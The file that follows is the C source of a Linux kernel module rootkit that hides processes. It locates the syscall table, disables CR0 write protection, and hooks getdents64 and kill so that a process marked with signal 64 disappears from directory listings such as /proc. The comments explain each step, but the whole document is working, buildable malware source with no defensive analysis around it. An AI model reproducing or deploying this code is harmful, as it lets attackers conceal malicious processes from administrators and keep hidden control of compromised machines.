#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/threads.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("Hiding processes");
MODULE_VERSION("0.01");

static unsigned long * __sys_call_table;

typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);
typedef asmlinkage long (*orig_kill_t)(const struct pt_regs *);
orig_getdents64_t orig_getdents64;
orig_kill_t orig_kill;

/* Global variable to store the pid that we are going to hide */
char hide_pid[NAME_MAX];

/* This is our hooked function for sys_kill */
asmlinkage int hook_kill(const struct pt_regs *regs)
{
	pid_t pid = regs->di;
	int sig = regs->si;

	if ( sig == 64 )
	{
		/* If we receive the magic signal, then we just sprintf the pid
		 * from the intercepted arguments into the hide_pid string */
		printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
		sprintf(hide_pid, "%d", pid);
		return 0;
	}

	return orig_kill(regs);
}

/* This is our hooked function for sys_getdents64 */
asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
	// int fd = regs->di;
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
	// int count = regs->dx;

	struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
	unsigned long offset = 0;

	int ret = orig_getdents64(regs);
	dirent_ker = kzalloc(ret, GFP_KERNEL);

	if ( (ret <= 0) || (dirent_ker == NULL) )
		return ret;

	long error = copy_from_user(dirent_ker, dirent, ret);
	if (error)
		goto done;

	while (offset < ret)
	{
		current_dir = (void *)dirent_ker + offset;

		/* We also have to check that the hide_pid string isn't empty! */
		if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0 ) )
		{
			printk(KERN_INFO "rootkit: hiding directory %s\n", hide_pid);
			if ( current_dir == dirent_ker )
			{
				ret -= current_dir->d_reclen;
				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
				continue;
			}
			previous_dir->d_reclen += current_dir->d_reclen;
		}
		else
		{
			previous_dir = current_dir;
		}

		offset += current_dir->d_reclen;
	}

	error = copy_to_user(dirent, dirent_ker, ret);
	if (error)
		goto done;

done:
	kfree(dirent_ker);
	return ret;

}

/* The built in linux write_cr0() function stops us from modifying
 * the WP bit, so we write our own instead */
inline void cr0_write(unsigned long cr0)
{
	asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

/* Bit 16 in the cr0 register is the W(rite) P(rotection) bit which
 * determines whether read-only pages can be written to. We are modifying
 * the syscall table, so we need to unset it first */
static inline void protect_memory(void)
{
	unsigned long cr0 = read_cr0();
	set_bit(16, &cr0);
	cr0_write(cr0);
}

static inline void unprotect_memory(void)
{
	unsigned long cr0 = read_cr0();
	clear_bit(16, &cr0);
	cr0_write(cr0);
}

/* Module initialization function */
static int __init rootkit_init(void)
{
	/* Grab the syscall table */
	__sys_call_table = kallsyms_lookup_name("sys_call_table");

	/* Grab the function pointer to the real sys_getdents64 syscall */
	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];

	printk(KERN_INFO "rootkit: Loaded >:-)\n");
	printk(KERN_DEBUG "rootkit: Found the syscall table at 0x%lx\n", __sys_call_table);
	printk(KERN_DEBUG "rootkit: getdents64 @ 0x%lx\n", orig_getdents64);
	printk(KERN_DEBUG "rootkit: kill @ 0x%lx\n", orig_kill);
	
	unprotect_memory();

	printk(KERN_INFO "rootkit: hooking getdents64 syscall\n");
	printk(KERN_INFO "rootkit: hooking kill syscall\n");
	/* Patch the function pointer to sys_getdents64 with our hook instead */
	__sys_call_table[__NR_getdents64] = (unsigned long)hook_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long)hook_kill;

	protect_memory();

	return 0;
}

static void __exit rootkit_exit(void)
{
	unprotect_memory();
	
	printk(KERN_INFO "rootkit: restoring getdents64 syscall\n");
	printk(KERN_INFO "rootkit: restoring kill syscall\n");
	__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	
	protect_memory();
	
	printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
